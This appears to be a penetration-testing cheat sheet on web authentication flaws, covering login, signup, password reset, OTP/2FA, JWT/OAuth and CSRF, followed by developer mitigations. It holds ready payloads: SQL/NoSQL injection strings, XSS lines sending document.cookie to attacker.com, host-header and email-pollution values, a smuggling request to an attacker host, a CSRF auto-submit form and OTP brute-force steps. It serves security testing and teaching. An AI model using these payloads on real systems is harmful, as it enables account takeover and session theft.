## Overview

Authentication vulnerabilities occur when web applications fail to properly verify user identity or manage sessions securely. These flaws can lead to **full account takeover (ATO)**, unauthorized access, and mass compromise. Authentication is the process of verifying a user's identity, traditionally reliant on credentials like username and password. Modern systems often add a second factor (2FA) or multiple factors (MFA) to enhance security—categorized as something you know (password, PIN), something you have (phone, hardware token), or something you are (biometric data).

Despite these layers, flawed implementations, business logic errors, and misconfigurations create numerous vectors for bypassing controls. Critical areas include login/registration flows, password reset mechanisms, MFA/SMS auth, session tokens (JWT/OAuth), and account management features.

---

## Exploitation Methods

### Login Panel Attacks

#### SQL Injection

**Check for:**
- Classic auth bypass: `' or '1'='1#` or `' or '1'='1'--`
- Username: `admin' --`
- Password: anything

**Tools:**
```bash
sqlmap -r login_request.txt -p username,password --level=2 --risk=2
```

**Payloads:**
```sql
' or '1'='1'--
admin' --
' or 1=1#
" or ""="
' OR '1'='1' /*
```

#### NoSQL Injection

**Payloads (JSON):**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"$gt": ""}
{"$ne": null}
{"$regex": ".*"}
```

#### LDAP Injection

**Basic bypass:**
```
*)(uid=*))(|(uid=*
```

#### Brute Force

**Check for:**
- Rate limiting (should lock after 5-10 attempts)
- Account lockout (potential DoS vector)
- IP blocking
- CAPTCHA presence

**User Enumeration via:**
- Different error messages ("User not found" vs "Wrong password")
- Response time differences
- Status code variations (200 vs 401/403)

#### Brute-Force Rate Limit Bypasses

If rate limiting is only based on a strict string match of the username or email, it can sometimes be bypassed.

**Payloads (try in the `email` or `username` parameter):**
```
" username@website.com"
"username@website.com "
"Username@website.com"
"myemail@email.com" -> "my.email@email.com" (Gmail dot trick)
"myemail@email.com" -> "myemail+123@email.com" (Gmail plus trick)
```

#### Credential Stuffing

Test for leaked credentials against the login endpoint. Many users reuse passwords across services, making this a high-impact attack if no other protections (like MFA) are in place.

#### Denial of Service via Long Passwords

**Check for:**
- Long Password DoS: Send 100,000+ character password → CPU/memory exhaustion → 500 error
- If there is no restriction on password length, submitting a very long string can cause high CPU usage on the server as it attempts to hash the password, potentially leading to a Denial of Service.

#### Hidden Parameters

**Check/Steps:**
- Check `.js` files (e.g., `login.js`) for undocumented params
- Fuzz common params: `debug=1`, `admin=true`, `role=admin`, `is_admin=true`, `skip_2fa=true`

#### Blind XSS

**Payloads:**
```html
Username: <svg/onload=fetch('https://YOUR-SERVER/?c='+document.cookie)>
Password: "><img src=x onerror=this.src='https://YOUR-SERVER/?c='+document.cookie>
<svg/onload=fetch('https://attacker.com/?c='+document.cookie)>
"><img src=x onerror=this.src='https://attacker.com/?'+document.cookie>
<script>eval(atob('BASE64_PAYLOAD'))</script>
```

---

### Registration/Signup Attacks

#### Duplicate Registration (Overwrite Existing User)

**Steps:**
1. Register with `victim@gmail.com` + password1
2. Register again with variations:
    - `Victim@gmail.com` (case change)
    - `victim+1@gmail.com` (+ symbol)
    - `victim@gmail.com%20` (trailing space/null byte: `%00`, `%09`)
    - `victim@gmail.com.attacker.com`
3. Try logging in with original email + new password → **ATO**

#### Registration-as-Reset (Upsert Bug)

**Critical:** Some APIs perform upsert on existing emails without verification.

**PoC:**
```http
POST /api/v4/admin/doRegistrationEntries HTTP/1.1
Host: target.com
Content-Type: application/json

{"email":"victim@example.com","password":"Hacked123!"}
```

**Impact:** Instant ATO, no token needed.

#### Path Overwrite

**Steps:**
- Register username: `index.php`, `login.php`, `admin.php`
- Visit `target.com/index.php` → Your profile hijacks the path

#### XSS in Registration Fields

```html
Username: <svg/onload=confirm(1)>
Email: "><svg/onload=confirm(1)>"@x.y
```

#### No Rate Limit

**Check for:**
- Use Burp Intruder to mass-create accounts
- Fills DB with fake accounts → business impact

#### Weak Password Policy

**Test:**
- Allow `123456`, `password`, `qwerty123`?
- Same password as email/username?
- Check on: signup, password reset, password change

---

### Password Reset Vulnerabilities

#### Host Header Poisoning in Reset Links

An application may use the `Host` header to generate password recovery links. Poisoning this header can cause the reset link, containing a sensitive token, to be sent to an attacker-controlled domain.

**Check/Steps:**
1. Initiate a password reset for a victim's account.
2. Intercept the request and modify the `Host` header.

**Payloads:**
- **Direct Replacement:** `Host: attacker-website.com`
- **Header Override:** Add headers like `X-Forwarded-Host: attacker-website.com`.
- **Multiple Host Headers:**
    ```http
    POST /users/password HTTP/1.1
    Host: vulnerable-website.com
    Host: attacker-website.com
    ...
    {"email": "victim@website.com"}
    ```
- **Path Bypass:** `Host: attacker-website.com/vulnerable-website.com`

**Other Headers to Test:**
```
X-Forwarded-Host
X-Host
X-Original-Host
X-Originating-IP
X-Forwarded-For
X-Remote-IP
X-Remote-Addr
X-Client-IP
X-Forwarded-Server
Forwarded: host=attacker.com
```

**Host Header Injection Payloads (Modify in password reset request):**
```http
Host: attacker.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com
Forwarded: host=attacker.com
X-Forwarded-Server: attacker.com
Host: attacker.com/vulnerable-website.com
```

#### Token Leak via Referrer

**Check/Steps:**
1. Request reset → click reset link
2. Click external link (e.g., Facebook icon)
3. Intercept request → check `Referer` header for token

If the password reset page loads third-party resources (analytics, scripts, images), the reset token in the URL could be leaked to those third-party domains via the `Referer` header.

#### Email Parameter Manipulation (Parameter Pollution)

If the password reset function accepts multiple email parameters, it might generate a token for the victim's account but send the reset email to both the victim and the attacker.

**Payloads:**
```bash
# Parameter pollution
email=victim@mail.com&email=attacker@mail.com

# Array
{"email":["victim@mail.com","attacker@mail.com"]}
{"email": ["victim@website.com", "attacker@website.com"]}

# CC/BCC injection
email=victim@mail.com%0A%0Dcc:attacker@mail.com
email=victim@mail.com%0A%0Dbcc:attacker@mail.com
email=victim@gmail.com%0d%0acc:attacker@gmail.com

# Separators
email=victim@mail.com,attacker@mail.com
email=victim@mail.com|attacker@mail.com
email=victim@example.com,attacker@example.com
email=victim@example.com attacker@example.com
```

#### IDOR in Reset API

**Change user identifier in reset request:**
```http
POST /api/changepass HTTP/1.1

{"email":"victim@mail.com","password":"newpass123"}
```

#### Weak/Predictable Reset Tokens

**Check if token is:**
- Timestamp-based
- Sequential/guessable
- Reusable
- Never expires
- Short (4-6 digits = brute-forceable)
- Not generated with a cryptographically secure random number generator

**Steps:**
Collect multiple tokens and analyze them for patterns (e.g., timestamps, incrementing numbers, weak hashing of user data).

#### Token Leakage in Response

**Check JSON response for:**
```json
{"resetToken": "abc123xyz", "status": "success"}
```

#### No Link Between Reset Code and Account

Some systems validate the reset token but fail to validate that it belongs to the user account specified in the request.

**Check/Steps:**
1. Request a password reset token for `attacker@example.com`.
2. Initiate the final password change request, but use the token from the attacker's account for `victim@example.com`.

```http
POST /users/password/recovery HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/json

{"email": "victim@website.com", "code": "<code-for-an-attacker-account>"}
```

#### Username Collision

**Steps:**
1. Register `admin` (with spaces before/after)
2. Request reset for `admin`
3. Use token to reset actual `admin` account

---

### SMS/OTP Authentication Flaws

**Common Issues:**
- **SMS Flood:** Send unlimited codes → user harassment
- **No Rate Limit:** Brute force 4-6 digit codes
- **Response Manipulation:** Enter wrong code → capture success response → replay on failed request
- **DoS:** Spam victim's number with reset codes → block legitimate login
- **Code Disclosure:** OTP leaked in response body/headers

#### OTP/Code Leakage in Response

In a critical misconfiguration, the server might send the valid 2FA code back in the response to the request that triggers the code generation. Always inspect the full response.

```http
POST /req-2fa/ HTTP/1.1
Host: vuln.com
...
email=victim@gmail.com

HTTP/1.1 200 OK
...
{"email": "victim@gmail.com", "code": "101010"}
```

#### No Rate-Limiting on OTP Verification

The most common brute-force vector. If there is no limit on the number of attempts to verify an OTP, an attacker can simply try all possible combinations.

**Check/Steps:**
1. Capture the OTP submission request in Burp Suite.
2. Send it to Intruder.
3. Configure a number-based payload for the OTP parameter (e.g., from `000000` to `999999` with 6-digit padding).
4. Launch the attack and look for a response that differs in length, status code, or content, indicating a successful guess.

#### Code Reusability (Old Codes Are Not Invalidated)

An application should invalidate an OTP code immediately after it's been used. If it doesn't, the same code can be used multiple times.

**Check/Steps:**
1. Log in with a valid OTP code.
2. Log out.
3. Attempt to log in again using the *exact same* OTP code.
4. Also, check if a code generated at T-1 is still valid after a new code is generated at T+0.

#### Cross-Account Code Usage (Missing Integrity Validation)

The application might verify that the OTP is valid but fail to verify that it belongs to the user trying to authenticate.

**Check/Steps:**
1. Log in to `attacker@example.com` and get a valid OTP (e.g., `123456`).
2. In a separate browser, log in as `victim@example.com` up to the 2FA prompt.
3. Submit the OTP `123456` (from the attacker's account) for the victim's login attempt.

---

### Email Verification Bypass

#### Forced Browsing (Direct Endpoint Access)

**Steps:**
- Skip verification step by directly accessing `/dashboard` or `/profile`

After successful login but before 2FA verification, the application may not properly protect subsequent endpoints.

**Check/Steps:**
1. Log in with valid credentials.
2. When presented with the 2FA prompt (e.g., at `/2fa-verify`), do not enter the code.
3. Manually browse to a post-authentication page, like `/dashboard` or `/account/profile`.
4. If this fails, try re-sending the request to `/dashboard` but add a `Referer` header pointing to the 2FA page: `Referer: https://example.com/2fa-verify`.

#### Response Manipulation

**Steps:**
- Change `403 Forbidden` → `200 OK`
- Change `{"verified": false}` → `{"verified": true}`

Some applications perform 2FA validation on the client-side based on the server's API response. By modifying a failure response into a success response, the client-side controls can be bypassed.

**Check/Steps:**
1. Enter an incorrect OTP code.
2. Intercept the server's response. It might look like this:
    ```json
    {"code": false, "success": false, "verificationStatus": false}
    ```
3. Modify the response to indicate success:
    ```json
    {"code": true, "success": true, "verificationStatus": true}
    ```
4. Forward the modified response to your browser.

#### Status Code Manipulation

Similar to response body manipulation, some applications rely solely on the HTTP status code to proceed.

**Check/Steps:**
1. Submit an incorrect OTP and intercept the response.
2. The server responds with an error, e.g., `HTTP/1.1 401 Unauthorized`.
3. Change the status code to `HTTP/1.1 200 OK`.
4. Forward the response.

#### Email Change Bypass

**Steps:**
1. Sign up as `attacker@mail.com`
2. Receive verification link (don't click yet)
3. Change email to `victim@mail.com` in settings
4. Open **old** verification link → verifies victim's email

#### Changing Email Without Password Confirmation

If an application allows a user to change their primary email address without re-authenticating (e.g., by entering their current password), a session hijacking, XSS, or CSRF vulnerability can be escalated to a full account takeover.

#### Linking Confirmed Email to Wrong Account

This logic flaw occurs when an email confirmation link intended for one account can be applied to another.

**Check/Steps:**
1. Attacker creates Account A and initiates the process to link `attacker@example.com`.
2. Attacker sends the confirmation link to the victim.
3. The victim, while logged into their own Account B, clicks the link.
4. If vulnerable, the application links the attacker's email to the victim's account, allowing the attacker to initiate a password reset and take over.

---

### 2FA/MFA Bypass Techniques

#### Bypassing with Default/Null/Junk Values

Poorly implemented validation logic might accept empty or default values.

**Check/Steps:**
Capture the 2FA submission request and modify the OTP parameter.
- `code=` (send a blank parameter)
- `code=null`
- `code=000000` or `123456`
- `code=ASDFGH` (send non-numeric characters)

**Payloads:**
```json
// In JSON requests
{"code": null}
{"code": ""}
{"code": 000000}
{"code": "000000"}

// In standard POST requests
code=
code=null
code=000000
```

#### Password Reset Disables or Bypasses 2FA

A common flaw is for the password reset process to log the user in immediately, bypassing the 2FA mechanism entirely.

**Check/Steps:**
1. Identify an account with 2FA enabled.
2. Perform a full password reset flow for that account.
3. After successfully resetting the password, observe if you are logged in directly or if you are prompted for 2FA. If you are logged in, the bypass is successful.

#### Bypassing Rate-Limits

- **IP Rotation:** Use a different source IP for each request or small batches of requests.
- **Parameter Tampering:** The rate limit might be tied to a username or other parameter. Try case variations (`victim` vs. `Victim`) or add whitespace.
- **Resetting via "Resend Code":** Some applications reset the attempt counter every time the "Resend Code" function is called. This allows for a few guesses, a resend, a few more guesses, and so on.

#### Enabling 2FA Doesn't Invalidate Active Sessions

If an attacker has already compromised a session, the user enabling 2FA on their account should invalidate all other active sessions. If it doesn't, the attacker's compromised session remains valid.

**Check/Steps:**
1. Log in on two different browsers (A and B).
2. On browser A, enable 2FA.
3. On browser B, try to navigate or perform a privileged action. If the session is still active, the vulnerability exists.

#### Abusing "Remember Me" Functionality

If the "remember me" feature uses a predictable cookie or relies on a spoofable IP address, it can be abused.

**Check/Steps:**
- **Predictable Cookie:** Analyze the "remember me" cookie. Is it easily guessable or just a base64 encoded username?
- **IP Spoofing:** If the feature works by whitelisting an IP, try spoofing the victim's IP using headers like `X-Forwarded-For`.

#### Abuse of Half-Authenticated Sessions

After submitting a correct password but before 2FA, the application might issue a session token with limited privileges. This "half-authenticated" state might be exploitable.

**Check/Steps:**
1. Submit correct credentials for an account.
2. Capture the response from the server. It may contain a session cookie.
3. Stop at the 2FA prompt.
4. Using the captured session cookie, attempt to access API endpoints directly, especially those that might disable 2FA or change account details.

#### CSRF / Clickjacking on "Disable 2FA"

If the functionality to disable 2FA is not protected by a CSRF token or requires password/OTP re-authentication, an attacker can trick a logged-in victim into disabling it.

**Check/Steps (CSRF):**
1. As an attacker, log in and capture the request to disable 2FA.
2. Generate a CSRF PoC for that request.
3. Host the PoC on a webpage and lure a logged-in victim to visit it.

**Check/Steps (Clickjacking):**
1. Check if the "disable 2FA" page can be loaded in an `iframe`.
2. If so, create a webpage that loads the page in a transparent `iframe` over a seemingly harmless button, tricking the victim into clicking the "disable" button.

#### Sensitive Information in JS Files

Rarely, developers may leave sensitive logic or even static codes in client-side JavaScript files. Scrutinize all loaded JS files for anything related to 2FA logic.

#### Older API / Staging Environment Bypasses

An application might have multiple API versions (e.g., `/api/v1/login`, `/api/v2/login`). The older version (`v1`) might not have 2FA enforcement. Also, check for publicly accessible staging or beta environments (`stage.example.com`, `beta.example.com`) which may have 2FA disabled for testing.

#### Account Ban Bypass

If an account is banned on the main application (`xyz.com`), check other related subdomains (`forms.xyz.com`, `support.xyz.com`) that use the same authentication system. You may be able to log in through one of these other properties.

#### Mixing 2FA Modes (SMS vs. TOTP)

If an application supports multiple 2FA methods, a logic flaw might allow an attacker to initiate one flow and complete it with another.

**Attack Flow Example:**
1. Victim has SMS-based 2FA enabled.
2. Attacker has TOTP-based 2FA enabled on their own account.
3. Attacker logs in with the victim's credentials. The application expects an SMS code.
4. Instead of proceeding, the attacker sends their own valid TOTP code to the TOTP verification endpoint, but using the victim's half-authenticated session cookie. If the backend is flawed, it might validate the TOTP and grant access to the victim's account.

---

### JWT/OAuth Vulnerabilities

#### JWT Attacks

**Check for:**
- **Algorithm Confusion:** Change `RS256` → `HS256`
- **None Algorithm:** Set `"alg": "none"`, remove signature
- **Weak Secret:** Brute force `HS256` key with `jwt_tool` or `hashcat`
- **Edit Claims:** Change `"user_id": 1` → `"user_id": 2`

**JWT None Algorithm Payload:**
```json
{"alg":"none","typ":"JWT"}
```
Remove signature, keep the dot: `header.payload.`

**Tools:**
```bash
jwt_tool <TOKEN> -T
jwt_tool <TOKEN> -X a  # Algorithm confusion
```

#### OAuth Misconfigurations

**Check for:**
- Redirect URI manipulation: `redirect_uri=https://attacker.com`
- State parameter missing/not validated → CSRF
- Open redirect in OAuth flow → token leak

---

### HTTP Request Smuggling

**Craft smuggled request to steal session cookies:**

```http
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: target.com
Content-Length: 83

0

GET http://attacker.burpcollaborator.net HTTP/1.1
X: 
```

**Tool:** [smuggler](https://github.com/defparam/smuggler)

---

### CSRF on Auth Actions

**Target sensitive actions:**
- Password change
- Email change
- Account deletion
- Add 2FA device

**PoC (HTML auto-submit form):**
```html
<form action="https://target.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
  <input type="submit">
</form>
<script>document.forms[0].submit();</script>
```

---

### Account Deletion Without Verification

**Check if deleting account requires:**
- Re-entering password
- CSRF token
- Email confirmation

**Exploit:** CSRF → XSS → auto-delete any user's account

---

### Session Fixation & Management

**Tests:**
- Does session ID change after login?
- Are old sessions invalidated on logout?
- Session timeout enforced?
- HttpOnly + Secure flags on cookies?

---

## Bypasses

### Rate Limit Bypass Techniques

- Rotate User-Agent headers
- Use `X-Forwarded-For`, `X-Originating-IP`, `X-Remote-IP`, `X-Client-IP`
- Add null bytes: `email=victim@mail.com%00`
- Change request method: POST → PUT/PATCH
- Case variation: `EmAiL` vs `email`
- Add extra params: `email=victim@mail.com&email2=junk`
- IP rotation with proxies
- Parameter tampering (case variations, whitespace)
- Resetting via "Resend Code" functionality

### CAPTCHA Bypass

- Remove CAPTCHA param entirely
- Send empty value: `captcha=`
- Reuse old valid CAPTCHA token
- Check if backend validates it

### Email Verification Bypass

- Response manipulation
- Direct navigation to protected pages
- Use old verification tokens after email change

---

## Top 10 Modern Payloads

### 1. SQL Injection (Auth Bypass)
```sql
' or '1'='1'--
admin' --
' or 1=1#
```

### 2. NoSQL Injection
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"$gt": ""}
{"$regex": ".*"}
```

### 3. XSS (Registration/Login)
```html
<svg/onload=fetch('https://attacker.com/?c='+document.cookie)>
"><img src=x onerror=this.src='https://attacker.com/?'+document.cookie>
```

### 4. Email Parameter Pollution
```
victim@mail.com%0A%0Dcc:attacker@mail.com
{"email":["victim@mail.com","attacker@mail.com"]}
email=victim@mail.com,attacker@mail.com
```

### 5. JWT None Algorithm
```json
{"alg":"none","typ":"JWT"}
```
Format: `header.payload.`

### 6. Host Header Injection
```http
Host: attacker.com
X-Forwarded-Host: attacker.com
```

### 7. 2FA Bypass Payloads
```json
{"code": null}
{"code": ""}
code=000000
```

### 8. OTP Brute Force Range
```
000000 to 999999 (6-digit padding)
0000 to 9999 (4-digit padding)
```

### 9. Response Manipulation
```json
Change: {"success": false} → {"success": true}
Change: HTTP/1.1 401 → HTTP/1.1 200 OK
```

### 10. Registration Variations
```
victim@gmail.com
Victim@gmail.com
victim+1@gmail.com
victim@gmail.com%20
victim@gmail.com%00
```

---

## Higher Impact Scenarios

### Pre-Account Takeover
- Register with victim's email before they do
- Claim verification link → control account from day 1

### Mass Account Takeover
- Registration upsert bug + user enumeration = automate ATO on all users

### Account Deletion → DoS
- CSRF or XSS auto-deletes user accounts en masse

### Session Hijacking via Smuggling
- Steal admin session cookie via HTTP request smuggling

### Admin Panel Access
- Path overwrite: Register as `admin.php`
- IDOR in reset: Change `user_id` to admin's

### Chaining for Maximum Impact

**Chain 1: Host Header Poisoning + No 2FA on Reset**
1. Attacker finds Host Header poisoning on the password reset page.
2. Sends a poisoned request for the victim's account.
3. The victim receives an email with a legitimate-looking link that, when clicked, sends the reset token to the attacker's server.
4. Attacker uses the token to reset the password. The application automatically logs them in, bypassing the victim's configured 2FA.
- **Result:** Full Account Takeover.

**Chain 2: Stored XSS + Leaky "Remember Me" Cookie**
1. Attacker finds a Stored XSS vulnerability in a user's profile page.
2. The application uses a "Remember Me" cookie to bypass 2FA, but fails to set the `HttpOnly` flag.
3. Attacker crafts an XSS payload (`document.location='http://attacker.com/?cookie='+document.cookie`) and gets the victim to view the compromised page.
4. The victim's "Remember Me" cookie is exfiltrated to the attacker.
5. Attacker injects the cookie into their browser and gains access to the account, bypassing 2FA.
- **Result:** Persistent Account Takeover.

---

## Authentication Bypass Checklist

### Phase 1: Pre-Authentication & Login
- [ ] **Endpoint Discovery:** Map all auth-related endpoints (`/login`, `/register`, `/forgot-password`, `/api/v1/auth`).
- [ ] **Username Enumeration:** Check for different responses on login for valid vs. invalid usernames.
- [ ] **Rate Limit Test:**
    - [ ] Brute-force a single account's password. Is it blocked?
    - [ ] Brute-force a single password across many users. Is it blocked?
    - [ ] Try rate limit bypasses (IP rotation, case changes in username).
- [ ] **Credential Stuffing:** Test a small list of common leaked credentials.
- [ ] **Parameter Fuzzing:** Fuzz login/registration requests for hidden parameters (`debug=1`, `role=admin`).

### Phase 2: Password Reset
- [ ] **Host Header Poisoning:** Intercept reset request → Inject `Host` and `X-Forwarded-Host` headers pointing to your server. Check if the reset link in the email is poisoned.
- [ ] **Parameter Pollution:** Try sending two `email` parameters (victim's and yours). Does the reset email come to you?
- [ ] **Token Analysis:**
    - [ ] Request several tokens. Are they predictable (e.g., based on time, Base64 user data)?
    - [ ] Is the token still valid after being used once?
- [ ] **State Flaw:** Does a successful password reset immediately log you in, bypassing 2FA?

### Phase 3: 2FA/MFA Verification
- [ ] **Brute-Force:** Send the OTP submission to Intruder. Is there a rate limit? (Payload: `0000` to `999999`).
- [ ] **Response Manipulation:** Enter wrong OTP → Intercept response → Change `{"success":false}` to `{"success":true}`.
- [ ] **Code Leakage:** Check the response of the request that *sends* the OTP. Is the code in the JSON response?
- [ ] **Logic Flaws:**
    - [ ] Can you reuse an old OTP?
    - [ ] Can you use an OTP from your account to log in to the victim's account?
- [ ] **Forceful Browsing:** After password login, but before 2FA, manually browse to `/dashboard`. Does it work?
- [ ] **Bypass via Alternative Flows:**
    - [ ] Try logging in via an OAuth provider (Google, GitHub). Does it skip 2FA?
    - [ ] Check older API versions (`/api/v1/`) or staging subdomains. Do they lack 2FA?
- [ ] **"Remember Me" Bypass:** If "remember me" is used, can you spoof the victim's IP with `X-Forwarded-For` to bypass 2FA?

### Phase 4: Post-Authentication & State Management
- [ ] **Disable 2FA Function:** Is there CSRF protection? Does it require password confirmation?
- [ ] **Session Invalidation:** Log in on Browser A → Enable 2FA → Is the session in Browser B still valid?
- [ ] **Half-Authenticated Session:** Log in with a password → Get the session cookie → Use that cookie to try and call the "disable 2FA" API endpoint directly.

---

## Offensive Tooling

Your primary tool will be a web proxy, but specific extensions and scripts accelerate the process.

- **Burp Suite Professional:** The non-negotiable standard.
    - **Intruder:** Essential for brute-forcing OTPs, fuzzing parameters, and testing rate limits.
    - **Repeater:** Your go-to for manual request manipulation (response modification, header injection).
    - **Turbo Intruder (Extension):** For high-speed, multi-threaded attacks. Perfect for finding race conditions in OTP validation or bypassing narrow rate limits.
    - **Autorize (Extension):** Critical for post-authentication testing. After you think you've bypassed a control, use Autorize to automatically check if your low-privilege session can access high-privilege endpoints.
    - **Param Miner (Extension):** Fuzz for hidden, unlinked parameters in authentication flows that might expose logic flaws (e.g., `is_admin=true`, `skip_2fa=true`).

- **ffuf / gobuster:** Use for discovering authentication-related endpoints that aren't immediately visible, such as `/backup-codes`, `/disable-2fa`, `/api/v1/login`.

- **2FAssassin:** A tool to automate some of the common 2FA bypass checks, especially brute-forcing.

- **sqlmap:** For automated SQL injection testing on authentication endpoints.

- **jwt_tool:** For JWT analysis and exploitation.

- **smuggler:** For HTTP request smuggling attacks.

---

## Recognizing Weak Mitigations (From an Attacker's POV)

### Weak Rate Limiting:
- **Target:** The limit is only on the login endpoint, but not on the OTP verification endpoint.
- **Target:** The limit is based only on IP address (easily bypassed with proxies).
- **Target:** The attempt counter resets if you click "resend code."
- **Target:** The application returns a different error message/statuscode for a correct code even when rate-limited, allowing for a side-channel attack.

### Incomplete Session Management:
- **Target:** Enabling 2FA or changing a password invalidates the *current* session but leaves all other sessions (e.g., on a mobile device) active.
- **Target:** The session cookie lacks the `HttpOnly` flag, making it vulnerable to XSS.
- **Target:** Session tokens are long-lived and never expire.
- **Target:** Session ID doesn't change after login (session fixation vulnerability).
- **Target:** Old sessions aren't invalidated on logout.

### Flawed Logic in Critical Functions:
- **Target:** The "Disable 2FA" function only requires a single click and has no CSRF token.
- **Target:** The application verifies that an OTP is mathematically valid but not that it belongs to the user currently authenticating.
- **Target:** A password reset logs the user in via a special "authenticated" URL, creating a separate auth flow that forgets to check for 2FA.
- **Target:** Email change doesn't require password re-confirmation.
- **Target:** Account deletion doesn't require password verification or CSRF protection.

### Weak Token Implementation:
- **Target:** Reset tokens are predictable or sequential.
- **Target:** Tokens don't expire or have very long expiration times.
- **Target:** Tokens can be reused multiple times.
- **Target:** Short OTP codes (4 digits) with no rate limiting.

### Missing Security Headers:
- **Target:** No `HttpOnly` flag on authentication cookies.
- **Target:** No `Secure` flag on cookies (allows interception over HTTP).
- **Target:** Missing `SameSite` attribute (vulnerable to CSRF).

---

## Mitigations

### For Developers

✅ **Implement:**

- **Strong rate limiting:** Account + IP-based with exponential backoff
- **Account lockout:** With exponential backoff (not just IP ban)
- **Multi-factor authentication:** TOTP preferred over SMS
- **CSRF tokens:** On all state-changing actions (password change, email change, disable 2FA, account deletion)
- **Secure session management:**
    - Rotate session IDs after login
    - Invalidate all sessions on password change
    - Invalidate all sessions on 2FA enable/disable
    - Set `HttpOnly`, `Secure`, and `SameSite` flags on cookies
    - Implement session timeout
- **Strong password policy enforcement:**
    - Minimum length (12+ characters)
    - Complexity requirements
    - Check against common password lists
    - Prevent reuse of old passwords
- **Email verification:**
    - Unique, unpredictable tokens (cryptographically secure random)
    - Short expiration time (15-30 minutes)
    - One-time use only
    - Verify token belongs to the user account
- **Input validation & output encoding:**
    - Prevent SQL injection with parameterized queries
    - Prevent NoSQL injection with proper input sanitization
    - Prevent XSS with context-aware output encoding
    - Validate all user inputs on server-side
- **CAPTCHA:** On sensitive forms (login, registration, password reset) after failed attempts
- **Logging & monitoring:**
    - Log all authentication events
    - Monitor for brute force attempts
    - Alert on suspicious patterns
    - Implement anomaly detection
- **OTP/2FA best practices:**
    - Use cryptographically secure random number generation
    - Implement strict rate limiting on verification endpoints
    - Invalidate codes immediately after use
    - Short expiration time (5-10 minutes)
    - Verify code belongs to the specific user
    - Don't leak codes in responses
- **Password reset security:**
    - Use cryptographically secure tokens
    - Validate Host header or use absolute URLs
    - Don't auto-login after reset if 2FA is enabled
    - Send notification to user when password is changed
    - Invalidate all sessions on password reset
- **Registration security:**
    - Prevent duplicate registrations with case-insensitive email checks
    - Normalize email addresses (trim spaces, convert to lowercase)
    - Don't perform upsert operations without verification
    - Implement reasonable limits on password length
    - Validate username characters and length
- **JWT/OAuth security:**
    - Use strong signing algorithms (RS256)
    - Never use `alg: none`
    - Use strong secrets for HMAC
    - Validate all claims
    - Implement short expiration times
    - Validate redirect URIs strictly
    - Implement and validate state parameter

❌ **Avoid:**

- **Predictable reset tokens:** Never use timestamps, sequential numbers, or weak hashing
- **User enumeration:** Use identical error messages for invalid username/password
- **Storing passwords insecurely:** Never use plaintext or weak hashing (MD5, SHA1). Use bcrypt, Argon2, or PBKDF2
- **Missing CSRF protection:** Protect all state-changing operations
- **Allowing duplicate registrations:** Normalize and validate email addresses
- **Long-lived sessions:** Implement reasonable timeouts and re-authentication for sensitive actions
- **Trusting client-side validation:** Always validate on server-side
- **Exposing sensitive information:** Don't leak tokens, codes, or detailed error messages
- **Weak rate limiting:** Implement multi-layered rate limiting (IP, account, endpoint)
- **Auto-login after password reset:** When 2FA is enabled, always require 2FA after reset
- **Single-factor authentication:** Implement MFA for all users, especially privileged accounts
- **Relying on Host header:** Use absolute URLs or validate strictly
- **Missing security headers:** Always set HttpOnly, Secure, SameSite on cookies
- **Client-side 2FA validation:** All validation must happen server-side
- **Reusable tokens/codes:** Invalidate immediately after use
- **Missing session invalidation:** Invalidate on logout, password change, 2FA changes

### Security Testing Requirements:

- **Penetration testing:** Regular security assessments of authentication flows
- **Code review:** Security-focused review of authentication logic
- **Automated scanning:** Regular vulnerability scans with tools like Burp Suite, OWASP ZAP
- **Threat modeling:** Identify and mitigate authentication-related threats
- **Security monitoring:** Real-time detection of authentication attacks
- **Incident response:** Plan for handling authentication breaches

### Additional Best Practices:

- **Principle of least privilege:** Grant minimum necessary permissions
- **Defense in depth:** Multiple layers of security controls
- **Secure by default:** Authentication should be secure out-of-the-box
- **Security awareness training:** Educate developers on authentication vulnerabilities
- **Regular updates:** Keep authentication libraries and frameworks up-to-date
- **Bug bounty program:** Incentivize security researchers to find vulnerabilities
- **Security documentation:** Document authentication flows and security controls
- **Compliance:** Follow industry standards (OWASP, PCI-DSS, NIST)

---

## References

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [PortSwigger Auth Testing](https://portswigger.net/web-security/authentication)
- [HackerOne Reports](https://hackerone.com/hacktivity?querystring=authentication)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
- [NIST Digital Identity Guidelines](https://pages.nist.gov/800-63-3/)

---

## Quick Reference Card

### Top 5 Quick Wins:

1. **OTP Brute Force:** Check if OTP verification has rate limiting. If not, use Burp Intruder with 000000-999999 payload.

2. **Response Manipulation:** Enter wrong OTP/credentials → Intercept → Change `{"success":false}` to `{"success":true}` or `401` to `200 OK`.

3. **Host Header Poisoning:** Password reset request → Add `X-Forwarded-Host: attacker.com` → Check if reset link points to your domain.

4. **Parameter Pollution:** Password reset → Send `email=victim@mail.com&email=attacker@mail.com` → Check if you receive the reset email.

5. **Direct Endpoint Access:** Log in (before 2FA) → Manually browse to `/dashboard` or `/api/user/profile` → Check if accessible.

### Critical Headers to Test:
```
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: attacker.com
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
Referer: https://example.com/2fa-verify
```

### Must-Check Files:
```
/login.js
/auth.js
/register.js
/app.js
/main.js
/bundle.js
```

### Common Vulnerable Endpoints:
```
/api/v1/login (older versions often lack 2FA)
/api/auth/reset
/api/user/disable-2fa
/api/account/email
/oauth/callback
/password/reset
/verify-otp
/resend-code
```

---

**🎯 Pro Tips:** 

- Always test both the web app AND mobile API endpoints—mobile often has weaker protections
- Check `.js` files for hidden endpoints and parameters
- Automation is your friend, but manual testing finds the gold
- Focus on logic flaws over known CVEs for authentication bugs
- Chain multiple low-severity bugs for critical impact
- Test both successful and failed authentication flows
- Don't forget to test logout, session timeout, and "remember me" functionality
- Check if APIs have different authentication requirements than the web interface
